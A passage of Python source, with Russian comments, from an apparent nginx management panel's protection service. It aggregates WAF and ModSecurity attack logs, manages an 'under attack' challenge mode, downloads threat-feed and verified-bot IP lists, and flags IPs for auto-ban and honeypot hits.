            "SELECT site, SUM(n) AS n FROM attack_minute WHERE ts>=? AND kind='waf' AND action='detected' GROUP BY site",
            (now - 86400,))}
        for sid, sp in self.svc.site_prot().items():
            if sp.enabled and sp.waf == "detect" and det.get(sid, 0) >= 50:
                out.append(("waf_learning", "warn", sid, f"за сутки записано {det[sid]} атак — они не блокируются",
                            None, det[sid], ""))
        # время прохождения проверки браузера
        ch = self.db.one("SELECT SUM(n) AS n, SUM(ms) AS ms FROM prot_minute WHERE ts>=? AND metric='challenge' "
                         "AND key='solved'", (now - 3600,)) or {}
        if (ch.get("n") or 0) >= 20 and ch["ms"] / ch["n"] >= 6000:
            out.append(("challenge_slow", "warn", "*", f"в среднем {ch['ms'] / ch['n'] / 1000:.1f} с при сложности "
                                                       f"{p.challenge_difficulty} бит", None,
                        round(ch["ms"] / ch["n"] / 1000, 1), ""))
        # поддельные роботы, которые только записываются
        if p.fake_bot_action == "detect":
            fb = self.db.one("SELECT SUM(n) AS n FROM attack_minute WHERE ts>=? AND kind='fakebot'", (now - 3600,)) or {}
            if (fb.get("n") or 0) >= 20:
                out.append(("fake_bots", "warn", "*", f"{fb['n']} запросов за час", None, fb["n"], ""))
        # активный атакующий без блокировки
        banned = self._banned()
        for r in self.db.query("SELECT ip, MAX(country) AS country, COUNT(*) AS n, COUNT(DISTINCT rule) AS rules "
                               "FROM attack_log WHERE ts>=? AND test=0 AND ip!='' AND action IN ('blocked','detected') "
                               "GROUP BY ip HAVING n>=50 ORDER BY n DESC LIMIT 3", (now - 3600,)):
            if r["ip"] not in banned and not any(_in_net(r["ip"], b) for b in banned if "/" in b):
                out.append(("attacker_active", "warn", "*",
                            f"{r['ip']}{' (' + r['country'] + ')' if r['country'] else ''}: {r['n']} срабатываний, "
                            f"правил: {r['rules']}", None, r["n"], r["ip"]))
        # правило частоты задевает много адресов
        for r in self.db.query("SELECT rule, COUNT(DISTINCT ip) AS ips, COUNT(*) AS n FROM attack_log WHERE ts>=? "
                               "AND kind='ratelimit' AND test=0 GROUP BY rule HAVING ips>=20", (now - 3600,)):
            out.append(("rate_rule_users", "info", "*", f"{self.svc.rule_title('ratelimit', r['rule'])}: "
                                                        f"{r['ips']} адресов, {r['n']} отказов за час",
                        None, r["ips"], r["rule"]))
        # «Под атакой» вручную больше суток
        st = self.svc.attack_state()
        for key, v in [("*", st.get("global"))] + list((st.get("sites") or {}).items()):
            if v and not v.get("auto") and now - (v.get("since") or now) > 86400 and \
                    (v.get("until") is None or v["until"] > now):
                out.append(("attack_mode_long", "info", key if key != "*" else "*",
                            f"{'все сайты' if key == '*' else names.get(key, key)}: "
                            f"{(now - v['since']) / 3600:.0f} ч", None, None, key))
        return out

    def rule_detail(self, kind: str, rule: str, hours: int = 168, site: str = "") -> Dict[str, Any]:
        now = time.time()
        since = now - hours * 3600
        step = bucket_step(hours)
        cond, args = self._cond(since, site=site)
        cond += " AND kind=? AND rule=?"
        args += [kind, rule]
        series = self.db.query(f"SELECT (ts/{step})*{step} AS b, action, SUM(n) AS n FROM attack_minute WHERE {cond} "
                               "GROUP BY b, action ORDER BY b", args)
        tot = {r["action"]: r["n"] for r in self.db.query(
            f"SELECT action, SUM(n) AS n FROM attack_minute WHERE {cond} GROUP BY action", args)}
        names = self.site_names()
        sites = self.db.query(f"SELECT site, SUM(n) AS n FROM attack_minute WHERE {cond} GROUP BY site ORDER BY n DESC",
                              args)
        for r in sites:
            r["name"] = names.get(r["site"], r["site"] or "—")
        lc = cond + " AND test=0"
        ips = self.db.query(f"SELECT ip, MAX(country) AS country, COUNT(*) AS n, MAX(ts) AS last FROM attack_log "
                            f"WHERE {lc} GROUP BY ip ORDER BY n DESC LIMIT 20", args)
        paths = self.db.query(f"SELECT uri, COUNT(*) AS n FROM attack_log WHERE {lc} GROUP BY uri ORDER BY n DESC "
                              "LIMIT 15", args)
        uas = self.db.query(f"SELECT ua, COUNT(*) AS n FROM attack_log WHERE {lc} GROUP BY ua ORDER BY n DESC LIMIT 10",
                            args)
        meta: Dict[str, Any] = {"title": self.svc.rule_title(kind, rule), "kind": kind, "rule": rule,
                                "kind_title": KINDS.get(kind, kind), "cat": rule_category(kind, rule)}
        if kind == "waf" and "/" in rule:
            wr = W.RULE_BY_ID.get(rule.split("/", 1)[1])
            if wr:
                meta.update({"id": wr.id, "level": wr.level, "note": wr.note, "examples": list(wr.examples)[:3],
                             "cve": wr.cve, "pattern": wr.pattern,
                             "fields": [W.TARGETS[t][1] for t in wr.targets if t in W.TARGETS],
                             "category": W.CATEGORIES.get(wr.cat, {}).get("title", wr.cat),
                             "mode": self.svc.settings().mode(wr.cat),
                             "disabled": wr.id in self.svc.settings().waf_disabled_rules})
        if kind == "modsec":
            meta["crs_group"] = CRS_GROUPS.get(rule.split("/", 1)[-1][:3], ("", ""))[1]
        return {"meta": meta, "hours": hours, "step": step, "since": since, "series": series, "totals": tot,
                "sites": sites, "ips": ips, "paths": paths, "uas": uas,
                "events": self.svc.events(limit=30, kind=kind, site=site, q=rule)}


def _in_net(ip: str, net: str) -> bool:
    try:
        return ipaddress.ip_address(ip) in ipaddress.ip_network(net, strict=False)
    except ValueError:
        return False


# =============================================================================
#  Служба
# =============================================================================
class ProtectionService:
    FLUSH_SEC = 60

    def __init__(self, app) -> None:
        self.app = app
        self.db = app.db
        self._settings: Optional[ProtectionSettings] = None
        self.counts: Counter = Counter()          # (минута, сайт, вид, правило, действие) → число
        self.minute_rows = 0
        self.minute_start = 0
        self.pending_rows: List[tuple] = []
        self.ip_hits: Dict[str, deque] = {}        # IP → время срабатываний фильтра (для автоблокировки)
        self.flagged: Dict[str, float] = {}
        self.recent: deque = deque(maxlen=200)     # последние события для живой ленты
        self.challenge_stats: Counter = Counter()  # served/passed/failed
        self.totals: Counter = Counter()           # (сайт, вид, действие) → число с запуска (для /metrics)
        self.pm: Counter = Counter()               # (минута, сайт, метрика, ключ) → число (prot_minute)
        self.pm_ms: Counter = Counter()            # то же → сумма миллисекунд (время решения проверки)
        self.modsec_pos: Tuple[int, int] = (0, -1)  # (inode, смещение) журнала аудита ModSecurity
        self.modsec_titles: Dict[str, str] = {}
        self.bot_totals: Counter = Counter()        # (робот, ok|fake) → число с запуска (для /metrics)
        self._lock: Optional[asyncio.Lock] = None
        self.feed_task_running = False

    # ------------------------------------------------------------------ настройки
    def settings(self) -> ProtectionSettings:
        if self._settings is None:
            self._settings = ProtectionSettings.model_validate(self.db.kv_get("protection_settings", {}))
        return self._settings

    def save(self, p: ProtectionSettings) -> None:
        self.db.kv_set("protection_settings", p.model_dump())
        self._settings = None
        self.app.touch()

    # ------------------------------------------------------------------ режим «Под атакой»
    def attack_state(self) -> Dict[str, Any]:
        st = self.db.kv_get("attack_mode", {}) or {}
        st.setdefault("global", None)
        st.setdefault("sites", {})
        return st

    def active_attack(self, now: Optional[float] = None) -> Tuple[bool, List[str]]:
        now = now or time.time()
        st = self.attack_state()
        g = st.get("global")
        glob = bool(g) and (g.get("until") is None or g["until"] > now)
        sites = [k for k, v in st["sites"].items() if v and (v.get("until") is None or v["until"] > now)]
        return glob, sites

    def render_attack_file(self) -> str:
        glob, sites = self.active_attack()
        lines = ["# Nginx Manager: режим «Под атакой» (c — проверять браузер). Меняется панелью.",
                 f'default "{"c" if glob else ""}";']
        for sid in sorted(sites, key=lambda x: int(x) if x.isdigit() else 0):
            lines.append(f'"{sid}" "c";')
        return "\n".join(lines) + "\n"

    async def sync_attack_file(self) -> Tuple[bool, str]:
        mgr = self.app.nginx
        async with mgr.lock:
            return await asyncio.to_thread(mgr.write_side_file, settings.attack_file, self.render_attack_file())

    async def set_attack(self, site: Optional[int], on: bool, minutes: Optional[int] = None, user: str = "system",
                         auto: bool = False, reason: str = "") -> Dict[str, Any]:
        st = self.attack_state()
        key = None if site is None else str(site)
        entry = {"since": time.time(), "until": time.time() + minutes * 60 if minutes else None, "by": user,
                 "auto": auto, "reason": reason} if on else None
        if key is None:
            st["global"] = entry
        elif entry:
            st["sites"][key] = entry
        else:
            st["sites"].pop(key, None)
        self.db.kv_set("attack_mode", st)
        pkey = "*" if key is None else key
        now = time.time()
        self.db.execute("UPDATE attack_periods SET end=? WHERE site=? AND end IS NULL", (now, pkey))
        if on:
            self.db.execute("INSERT INTO attack_periods(site,start,auto,who,reason) VALUES(?,?,?,?,?)",
                            (pkey, now, 1 if auto else 0, user, reason[:300]))
        ok, out = await self.sync_attack_file()
        who = "автоматически" if auto else user
        name = "всех сайтов" if key is None else f"сайта «{self.site_name(key)}»"
        if on:
            dur = f" на {minutes} мин" if minutes else ""
            self.db.event("warning", "protection", f"Режим «Под атакой» включён для {name}{dur} ({who})"
                          + (f": {reason}" if reason else ""), {"site": key, "auto": auto})
        else:
            self.db.event("info", "protection", f"Режим «Под атакой» выключен для {name} ({who})", {"site": key})
        return {"ok": ok, "output": out[-1000:] if not ok else "", "state": self.attack_state()}

    def alert_metric(self, m: str, site: str, window: int) -> Tuple[Optional[float], str]:
        """Значение метрик оповещений attacks_blocked (в минуту за окно) и under_attack (1/0)."""
        now = time.time()
        if m == "under_attack":
            glob, sites = self.active_attack(now)
            on = glob or (bool(sites) if site == "*" else str(site) in sites)
            return (1.0 if on else 0.0), ("для всех сайтов" if glob else
                                          ", ".join(self.site_name(x) for x in sites) if on else "")
        start = int((now - window) // 60) * 60
        q = "SELECT kind, SUM(n) AS n FROM attack_minute WHERE ts>=? AND action='blocked'"
        args: list = [start]
        if site != "*":
            q += " AND site=?"
            args.append(str(site))
        rows = self.db.query(q + " GROUP BY kind ORDER BY n DESC", tuple(args))
        pend = Counter()
        for (ts, s, kind, _rule, act), n in self.counts.items():
            if ts >= start and act == "blocked" and (site == "*" or s == str(site)):
                pend[kind] += n
        by = Counter({r["kind"]: r["n"] or 0 for r in rows}) + pend
        total = sum(by.values())
        minutes = max(1.0, (now - start) / 60)
        return round(total / minutes, 2), ", ".join(f"{k}: {v}" for k, v in by.most_common(5))

    def site_name(self, sid: str) -> str:
        r = self.db.one("SELECT name FROM sites WHERE id=?", (int(sid),)) if str(sid).isdigit() else None
        return r["name"] if r else str(sid)

    async def auto_attack_tick(self, now: Optional[float] = None) -> List[str]:
        """Раз в минуту: включить «Под атакой» для сайта при всплеске нагрузки, выключить после затишья."""
        p = self.settings()
        now = now or time.time()
        st = self.attack_state()
        changed: List[str] = []
        # истёкшие ручные и автоматические режимы
        for key, v in list(st["sites"].items()):
            if v and v.get("until") and v["until"] <= now:
                if v.get("auto") and self.site_rps(key, now) >= p.auto_rps:
                    continue  # нагрузка ещё высокая — держим
                await self.set_attack(int(key), False, user="система", auto=bool(v.get("auto")))
                changed.append(key)
        g = st.get("global")
        if g and g.get("until") and g["until"] <= now:
            await self.set_attack(None, False, user="система", auto=bool(g.get("auto")))
        if not p.auto_attack:
            return changed
        _, active = self.active_attack(now)
        for sid, s in self.app.nginx.load_state().sites:
            if not s.enabled or not s.protection.enabled or s.protection.challenge != "auto" or str(sid) in active:
                continue
            rps = self.site_rps(str(sid), now)
            if rps < p.auto_rps:
                continue
            base = self.site_baseline(str(sid), now)
            if rps < p.auto_factor * max(base, 0.1):
                continue
            await self.set_attack(sid, True, p.auto_minutes, auto=True,
                                  reason=f"{rps:.0f} запросов/с при обычных {base:.1f}")
            changed.append(str(sid))
        return changed

    def site_rps(self, sid: str, now: float) -> float:
        m = int(now // 60) * 60 - 60
        r = self.db.scalar("SELECT COALESCE(SUM(req),0) FROM stats_minute WHERE site=? AND ts>=? AND ts<?",
                           (sid, m - 60, m + 60)) or 0
        return r / 120.0

    def site_baseline(self, sid: str, now: float) -> float:
        r = self.db.one("SELECT COALESCE(SUM(req),0) AS n, COUNT(*) AS m FROM stats_minute WHERE site=? AND ts>=? "
                        "AND ts<?", (sid, now - 86400, now - 900))
        return (r["n"] / 60.0 / max(r["m"], 1)) if r else 0.0

    # ------------------------------------------------------------------ списки угроз
    def feed_dir(self) -> Path:
        d = settings.data_dir / "threats"
        d.mkdir(parents=True, exist_ok=True)
        return d

    def feed_status(self) -> Dict[str, Any]:
        return self.db.kv_get("threat_status", {}) or {}

    def render_threats(self) -> Tuple[str, int]:
        p = self.settings()
        lines = ["# Nginx Manager: списки угроз (раздел «Защита»). Файл обновляется панелью."]
        seen, total = set(), 0
        for f in p.threat_feeds:
            if not f.enabled:
                continue
            path = self.feed_dir() / f"{f.id}.txt"
            if not path.exists():
                continue
            for net in path.read_text().split():
                if net in seen:
                    continue
                seen.add(net)
                lines.append(f'{net} "{f.id}:{f.action}";')
                total += 1
        return "\n".join(lines) + "\n", total

    def render_bots(self) -> Tuple[str, str]:
        """Файлы для geo $nm_vbot (адрес → робот) и map $nm_bot_claim (User-Agent → робот). В карту User-Agent
        попадают только роботы, чьи адреса загружены: иначе любой настоящий робот считался бы поддельным."""
        p = self.settings()
        nets = ["# Nginx Manager: официальные адреса роботов (раздел «Защита → Роботы»). Файл обновляется панелью."]
        uas = ["# Nginx Manager: User-Agent проверяемых роботов. Файл обновляется панелью."]
        on = p.fake_bot_action != "off" or p.verified_skip_challenge
        for b in p.verified_bots:
            path = self.feed_dir() / f"bot-{b.id}.txt"
            if not (on and b.enabled and path.exists()):
                continue
            items = path.read_text().split()
            if not items:
                continue
            for net in items:
                nets.append(f"{net} {b.id};")
            uas.append(f"{W.nginx_quote('~*(?:' + b.ua + ')')} {b.id};")
        return "\n".join(nets) + "\n", "\n".join(uas) + "\n"

    async def update_feeds(self, force: bool = False, only: Optional[str] = None) -> Dict[str, Any]:
        p = self.settings()
        status = self.feed_status()
        now = time.time()
        results = {}
        for f in p.threat_feeds:
            if not f.enabled or (only and f.id != only):
                continue
            st = status.get(f.id, {})
            if not force and st.get("updated") and now - st["updated"] < p.threat_update_hours * 3600 and st.get("ok"):
                continue
            try:
                text = await asyncio.to_thread(fetch_feed, f.url)
                nets, bad = parse_feed(text)
                if not nets:
                    raise ValueError("в списке не найдено ни одного адреса")
                (self.feed_dir() / f"{f.id}.txt").write_text("\n".join(nets) + "\n")
                status[f.id] = {"ok": True, "count": len(nets), "skipped": bad, "updated": now, "error": ""}
            except Exception as e:  # noqa: BLE001 — сеть, формат, файл: ошибка показывается у списка
                prev = status.get(f.id, {})
                status[f.id] = {**prev, "ok": False, "error": feed_error(e), "tried": now}
                self.db.event("warning", "protection", f"Список угроз «{f.name}» не обновлён: {feed_error(e)}")
            results[f.id] = status[f.id]
        p_bots = [b for b in p.verified_bots if b.enabled] \
            if (p.fake_bot_action != "off" or p.verified_skip_challenge) else []
        for b in p_bots:
            if only and only != f"bot:{b.id}":
                continue
            key = f"bot:{b.id}"
            st = status.get(key, {})
            if not force and st.get("updated") and now - st["updated"] < p.threat_update_hours * 3600 and st.get("ok"):
                continue
            try:
                text = await asyncio.to_thread(fetch_feed, b.url)
                nets, bad = parse_feed(text)
                if not nets:
                    raise ValueError("в списке не найдено ни одного адреса")
                (self.feed_dir() / f"bot-{b.id}.txt").write_text("\n".join(nets) + "\n")
                status[key] = {"ok": True, "count": len(nets), "skipped": bad, "updated": now, "error": ""}
            except Exception as e:  # noqa: BLE001
                prev = status.get(key, {})
                status[key] = {**prev, "ok": False, "error": feed_error(e), "tried": now}
                self.db.event("warning", "protection", f"Адреса робота «{b.name}» не обновлены: {feed_error(e)}")
            results[key] = status[key]
        self.db.kv_set("threat_status", status)
        if p_bots or any(not b.enabled for b in p.verified_bots):
            bots, ua = self.render_bots()
            mgr = self.app.nginx
            async with mgr.lock:
                ok1, out1 = await asyncio.to_thread(mgr.write_side_file, settings.bots_file, bots)
                ok2, out2 = await asyncio.to_thread(mgr.write_side_file, settings.bots_ua_file, ua) if ok1 \
                    else (False, out1)
            if not (ok1 and ok2):
                self.db.event("error", "protection", "Не удалось подключить адреса роботов к nginx",
                              {"output": (out2 or out1)[-1500:]})
        content, total = self.render_threats()
        mgr = self.app.nginx
        async with mgr.lock:
            ok, out = await asyncio.to_thread(mgr.write_side_file, settings.threats_file, content)
        if not ok:
            self.db.event("error", "protection", "Не удалось подключить списки угроз к nginx", {"output": out[-1500:]})
        return {"ok": ok, "total": total, "feeds": results, "output": "" if ok else out[-1500:]}

    # ------------------------------------------------------------------ журнал атак (из сборщика статистики)
    def observe(self, r: Dict[str, Any], site: str, country: str, ts: float) -> None:
        """Строка журнала доступа → счётчики и журнал атак. Вызывается сборщиком для каждой строки."""
        wa = r.get("wa") or ""
        wf = r.get("wf") or ""
        ch = r.get("ch") or ""
        status = r.get("status", 0)
        uri = r.get("uri") or ""
        test = "nm_selftest=" in uri
        events = []
        if wf and wa and wa[0] not in "ax":
            act = {"block": "blocked", "drop": "blocked", "detect": "detected", "log": "detected",
                   "challenge": "challenged"}.get(wa)
            if act:
                kind = wf.split("/", 1)[0]
                kind = kind if kind in ("custom", "threat", "hotlink", "fakebot") else "waf"
                events.append((kind, wf, act))
        mn = int(ts // 60) * 60
        if ch in ("c", "c0"):
            events.append(("challenge", "challenge", "challenged"))
            self.challenge_stats["served"] += 1
            if not test:
                self.pm[(mn, site, "challenge", "served")] += 1
        elif ch == "c1":
            self.challenge_stats["passed"] += 1
            if not test:
                self.pm[(mn, site, "challenge", "passed")] += 1
        if r.get("rs") == "REJECTED" or (status == 429 and not r.get("ustatus") and not r.get("rs")):
            # rs — $limit_req_status (nginx 1.17.6+); 429 без ответа бэкенда — ограничение частоты или соединений
            events.append(("ratelimit", "ratelimit/" + (r.get("ri") or "site"), "blocked"))
        bt = r.get("bt") or ""
        if bt and bt[0] != ":" and not test:
            bot, _, ok = bt.partition(":")
            key = f"{bot}:{'ok' if ok == '1' else 'fake'}"
            self.pm[(mn, site, "bot", key)] += 1
            self.bot_totals[(bot, "ok" if ok == "1" else "fake")] += 1
        if status == 421:
            events.append(("sni", "sni", "blocked"))
        ip = r.get("ip") or ""
        if site not in ("-", "panel", "") and self._honeypot(site, uri):
            events.append(("honeypot", "honeypot", "banned"))
        for kind, rule, act in events:
            self._count(ts, site, kind, rule, act, test)
            self._row(ts, site, ip, country, kind, rule, act, r, test)
            if not test and kind == "waf" and act in ("blocked", "detected"):
                self._autoban(ip, ts, rule, uri, country, r.get("host") or "")
            if not test and kind == "honeypot":
                self._honeypot_ban(ip, ts, uri, country, r.get("host") or "")

    def _honeypot(self, site: str, uri: str) -> bool:
        p = self.settings()
        if not p.honeypot_paths:
            return False
        sp = self.site_prot().get(site)
        if not sp or not sp.enabled or not sp.honeypot:
            return False
        path = uri.split("?", 1)[0].lower()
        for h in p.honeypot_paths:
            if h.startswith("~"):
                if re.search(h[1:], path):
                    return True
            elif path.startswith(h.lower()):
                return True
        return False

    _site_prot_cache: Tuple[int, Dict[str, Any]] = (-1, {})

    def site_prot(self) -> Dict[str, Any]:
        rev = self.app.revision
        if self._site_prot_cache[0] != rev:
            out = {}
            for row in self.db.query("SELECT id, data FROM sites"):
                try:
                    out[str(row["id"])] = Site.model_validate(json.loads(row["data"])).protection
                except Exception:  # noqa: BLE001
                    continue
            self._site_prot_cache = (rev, out)
        return self._site_prot_cache[1]

    def _count(self, ts, site, kind, rule, act, test) -> None:
        if test:
            return
        self.counts[(int(ts // 60) * 60, site, kind, rule, act)] += 1
        self.totals[(site, kind, act)] += 1

    def _row(self, ts, site, ip, country, kind, rule, act, r, test) -> None:
        m = int(ts // 60)
        if m != self.minute_start:
            self.minute_start, self.minute_rows = m, 0
        self.minute_rows += 1
        if self.minute_rows > self.settings().log_per_minute and not test:
            return
        row = (ts, site, ip, country, kind, rule, act, (r.get("method") or "")[:10], (r.get("uri") or "")[:500],
               (r.get("ua") or "")[:300], int(r.get("status") or 0), (r.get("rid") or "")[:40],
               (r.get("host") or "")[:200], 1 if test else 0)
        self.pending_rows.append(row)
        self.recent.append({"ts": ts, "site": site, "ip": ip, "country": country, "kind": kind, "rule": rule,
                            "action": act, "method": row[7], "uri": row[8][:200], "status": row[10], "test": test})

    def _autoban(self, ip: str, ts: float, rule: str, uri: str, country: str, host: str) -> None:
        p = self.settings()
        if not p.autoban_waf or not ip or not self.app.panel().autoban_enabled:
            return
        window = self.app.panel().autoban_window
        q = self.ip_hits.get(ip)
        if q is None:
            if len(self.ip_hits) > 100_000:
                self.ip_hits.clear()
            q = self.ip_hits[ip] = deque(maxlen=max(p.autoban_waf, 1))
        q.append(ts)
        if len(q) >= p.autoban_waf and ts - q[0] <= window:
            last = self.flagged.get(ip)
            if last and ts - last < window:
                return
            self.flagged[ip] = ts
            det = getattr(getattr(self.app, "bans", None), "detector", None)
            if det is not None:
                info = {"ip": ip, "rule": "waf", "title": "Атаки (фильтр запросов)", "count": len(q),
                        "window": window, "ts": ts, "sample": uri[:300], "host": host[:200], "country": country,
                        "requests": len(q), "e4xx": 0, "e401": 0, "scan": len(q), "default": 0, "waf_rule": rule}
                det.candidates.append(info)
                det.suspicious[ip] = info

    def _honeypot_ban(self, ip: str, ts: float, uri: str, country: str, host: str) -> None:
        det = getattr(getattr(self.app, "bans", None), "detector", None)
        if det is None or not ip or (self.flagged.get("hp:" + ip, 0) > ts - 60):
            return
        self.flagged["hp:" + ip] = ts
        info = {"ip": ip, "rule": "honeypot", "title": "Ловушка для сканеров", "count": 1, "window": 60, "ts": ts,
                "sample": uri[:300], "host": host[:200], "country": country, "requests": 1, "e4xx": 0, "e401": 0,
                "scan": 1, "default": 0, "ban_minutes": self.settings().honeypot_minutes, "force": True}
        det.candidates.append(info)
        det.suspicious[ip] = info

    @property
    def analytics(self) -> "ProtectionAnalytics":
        if not hasattr(self, "_analytics"):
            self._analytics = ProtectionAnalytics(self)
        return self._analytics

    def ip_in_feeds(self, ip: str) -> List[Dict[str, str]]:
        """В каких загруженных списках угроз и диапазонах роботов есть адрес."""
        try:
            addr = ipaddress.ip_address(ip)
        except ValueError:
            return []
        p = self.settings()
        out = []
        items = [(f"{f.id}.txt", f.name, "threat", f.action) for f in p.threat_feeds if f.enabled] + \
                [(f"bot-{b.id}.txt", b.name, "bot", "") for b in p.verified_bots if b.enabled]
        for fn, name, typ, action in items:
            path = self.feed_dir() / fn
            if not path.exists():
                continue
            try:
                for net in path.read_text().split():
                    if "/" not in net:
                        if net == ip:
                            out.append({"name": name, "type": typ, "action": action, "net": net})
                            break
                    elif addr in ipaddress.ip_network(net, strict=False):
                        out.append({"name": name, "type": typ, "action": action, "net": net})
                        break
            except (OSError, ValueError):
                continue
        return out

    # ------------------------------------------------------------------ ModSecurity: журнал аудита
    @staticmethod
    def modsec_log() -> Path:
        return settings.log_dir / "nm-modsec-audit.log"

    def modsec_tick(self, from_start: bool = False) -> int:
        """Дочитать журнал аудита ModSecurity (JSON, транзакция на строку) и записать события в журнал атак.
        При запуске панели читаем с конца файла, после ротации — с начала нового."""
        path = self.modsec_log()
        try:
            st = path.stat()
        except OSError:
            return 0
        ino, pos = self.modsec_pos
        if pos < 0:
            pos = 0 if from_start else st.st_size
        elif ino != st.st_ino or st.st_size < pos:
            pos = 0
        if st.st_size <= pos:
            self.modsec_pos = (st.st_ino, pos)
            return 0
        with path.open("rb") as f:
            f.seek(pos)
            data = f.read(min(st.st_size - pos, 16 * 1024 * 1024))
        cut = data.rfind(b"\n")
        if cut < 0:
            return 0
        self.modsec_pos = (st.st_ino, pos + cut + 1)
        n = 0
        for line in data[:cut].splitlines():
            try:
                tr = json.loads(line)["transaction"]
            except (ValueError, KeyError, TypeError):
                continue
            if self.observe_modsec(tr):
                n += 1
        return n

    def observe_modsec(self, tr: Dict[str, Any], ts: Optional[float] = None) -> bool:
        ts = ts or time.time()
        uid = str(tr.get("unique_id") or "")
        site, _, rest = uid.partition("-")
        _pa, _, rid = rest.partition("-")
        req = tr.get("request") or {}
        hdr = {str(k).lower(): v for k, v in (req.get("headers") or {}).items()}
        uri = str(req.get("uri") or "")
        test = "nm_selftest=" in uri
        code = int((tr.get("response") or {}).get("http_code") or 0)
        best = None
        for m in tr.get("messages") or []:
            d = m.get("details") or {}
            rule = str(d.get("ruleId") or "")
            if not rule or rule in CRS_SKIP or rule.startswith("90") or rule.startswith("419"):
                continue
            try:
                sev = int(d.get("severity") or 9)
            except ValueError:
                sev = 9
            if best is None or sev < best[0]:
                best = (sev, rule, str(m.get("message") or "")[:200])
        if best is None:
            return False
        rule = best[1]
        if best[2]:
            self.modsec_titles[rule] = best[2]
        act = "blocked" if code in (400, 403) else "detected"
        ip = str(tr.get("client_ip") or "")
        agg = getattr(getattr(self.app, "stats", None), "agg", None)
        country = ""
        try:
            if agg is not None and self.app.panel().geoip_enabled and agg.geoip.reader:
                country = agg.geoip.country(ip)
        except Exception:  # noqa: BLE001
            country = ""
        r = {"method": req.get("method") or "", "uri": uri, "ua": hdr.get("user-agent", ""), "status": code,
             "rid": rid, "host": hdr.get("host", "")}
        site = site if site.isdigit() else ""
        self._count(ts, site, "modsec", f"modsec/{rule}", act, test)
        self._row(ts, site, ip, country, "modsec", f"modsec/{rule}", act, r, test)
        if not test:
            self._autoban(ip, ts, f"modsec/{rule}", uri, country, r["host"])
        return True

    def record_challenge(self, site: str, result: str, secs: Optional[float] = None) -> None:
        """Итог проверки браузера (решена / неверное решение) от страницы проверки панели."""
        site = site if site.isdigit() else ""
        self.challenge_stats[result] += 1
        mn = int(time.time() // 60) * 60
        self.pm[(mn, site, "challenge", result)] += 1
        if secs is not None:
            self.pm_ms[(mn, site, "challenge", result)] += int(secs * 1000)
            b = "lt1" if secs < 1 else "1_3" if secs < 3 else "3_10" if secs < 10 else "gt10"
            self.pm[(mn, site, "solve", b)] += 1

    def flush(self) -> int:
        """Записать накопленное в базу (вызывается раз в несколько секунд)."""
        rows, self.pending_rows = self.pending_rows, []
        counts, self.counts = self.counts, Counter()
        pm, self.pm = self.pm, Counter()
        pm_ms, self.pm_ms = self.pm_ms, Counter()
        if pm:
            self.db.executemany("INSERT INTO prot_minute(ts,site,metric,key,n,ms) VALUES(?,?,?,?,?,?) "
                                "ON CONFLICT(ts,site,metric,key) DO UPDATE SET n=n+excluded.n, ms=ms+excluded.ms",
                                [(*k, n, pm_ms.get(k, 0)) for k, n in pm.items()])
        if self.modsec_titles:
            titles = self.db.kv_get("modsec_titles", {}) or {}
            if any(titles.get(k) != v for k, v in self.modsec_titles.items()):
                titles.update(self.modsec_titles)
                self.db.kv_set("modsec_titles", dict(list(titles.items())[-3000:]))
        if rows:
            self.db.executemany("INSERT INTO attack_log(ts,site,ip,country,kind,rule,action,method,uri,ua,status,rid,"
                                "host,test) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)", rows)
        if counts:
            self.db.executemany("INSERT INTO attack_minute(ts,site,kind,rule,action,n) VALUES(?,?,?,?,?,?) "
                                "ON CONFLICT(ts,site,kind,rule,action) DO UPDATE SET n=n+excluded.n",
                                [(*k, n) for k, n in counts.items()])
        return len(rows)

    def cleanup(self) -> None:
        cut = time.time() - self.settings().log_days * 86400
        self.db.execute("DELETE FROM attack_log WHERE ts<?", (cut,))
        self.db.execute("DELETE FROM attack_minute WHERE ts<?", (cut,))
        self.db.execute("DELETE FROM prot_minute WHERE ts<?", (cut,))
        self.db.execute("DELETE FROM attack_periods WHERE end IS NOT NULL AND end<?", (cut,))

    # ------------------------------------------------------------------ отчёты
    def overview(self, hours: int = 24, site: str = "") -> Dict[str, Any]:
        now = time.time()
        since = now - hours * 3600
        cond, args = "ts>=?", [since]
        if site:
            cond += " AND site=?"
            args.append(site)
        tot = {r["action"]: r["n"] for r in self.db.query(
            f"SELECT action, SUM(n) AS n FROM attack_minute WHERE {cond} GROUP BY action", args)}
        by_kind = self.db.query(f"SELECT kind, action, SUM(n) AS n FROM attack_minute WHERE {cond} "
                                "GROUP BY kind, action ORDER BY n DESC", args)
        rules = self.db.query(f"SELECT kind, rule, action, SUM(n) AS n FROM attack_minute WHERE {cond} "
                              "GROUP BY kind, rule, action ORDER BY n DESC LIMIT 25", args)
        sites = self.db.query(f"SELECT site, SUM(n) AS n FROM attack_minute WHERE {cond} AND action IN "
                              "('blocked','detected','challenged','banned') GROUP BY site ORDER BY n DESC LIMIT 15", args)
        lcond = cond + " AND test=0"
        ips = self.db.query(f"SELECT ip, country, COUNT(*) AS n, MAX(ts) AS last, "
                            f"GROUP_CONCAT(DISTINCT kind) AS kinds FROM attack_log WHERE {lcond} "
                            "GROUP BY ip ORDER BY n DESC LIMIT 20", args)
        countries = self.db.query(f"SELECT country, COUNT(*) AS n FROM attack_log WHERE {lcond} AND country!='' "
                                  "GROUP BY country ORDER BY n DESC LIMIT 15", args)
        uris = self.db.query(f"SELECT uri, COUNT(*) AS n FROM attack_log WHERE {lcond} GROUP BY uri "
                             "ORDER BY n DESC LIMIT 15", args)
        step = 300 if hours <= 6 else 1800 if hours <= 48 else 3 * 3600
        buckets = self.db.query(f"SELECT (ts/{step})*{step} AS b, kind, SUM(n) AS n FROM attack_minute WHERE {cond} "
                                "AND action IN ('blocked','detected','challenged','banned') GROUP BY b, kind ORDER BY b",
                                args)
        names = {str(r["id"]): r["name"] for r in self.db.query("SELECT id, name FROM sites")}
        for r in sites:
            r["name"] = names.get(r["site"], r["site"])
        for r in rules:
            r["title"] = self.rule_title(r["kind"], r["rule"])
        glob, active = self.active_attack()
        chal = {r["key"]: r["n"] for r in self.db.query(
            f"SELECT key, SUM(n) AS n FROM prot_minute WHERE {cond} AND metric='challenge' GROUP BY key", args)}
        return {"hours": hours, "since": since, "totals": tot, "by_kind": by_kind, "rules": rules, "sites": sites,
                "challenge_period": chal,
                "ips": ips, "countries": countries, "uris": uris, "step": step, "series": buckets,
                "attack": {"global": glob, "sites": active, "state": self.attack_state()},
                "challenge": dict(self.challenge_stats), "kinds": KINDS, "actions": ACTIONS}

    def rule_title(self, kind: str, rule: str) -> str:
        if kind == "waf" and "/" in rule:
